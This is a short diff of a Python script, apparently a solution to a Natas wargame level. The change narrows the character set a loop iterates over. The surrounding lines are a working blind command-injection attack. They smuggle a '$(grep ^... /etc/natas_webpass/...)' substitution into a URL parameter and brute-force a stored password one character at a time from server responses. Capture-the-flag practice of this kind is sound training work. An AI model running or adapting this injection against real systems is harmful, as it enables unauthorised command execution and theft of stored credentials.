@@ -29,7 +29,7 @@ def bruteforce_blind_injection():
            parsedChars += c
 
    for i in range(32):
-       for c in chars:
+       for c in parsedChars:
            r = requests.get(host+'?needle=$(grep ^' + flag + c + ' /etc/natas_webpass/natas17)shallows', auth=(user, password))
            if r.content.find(existMsg) != -1:
               flag += c
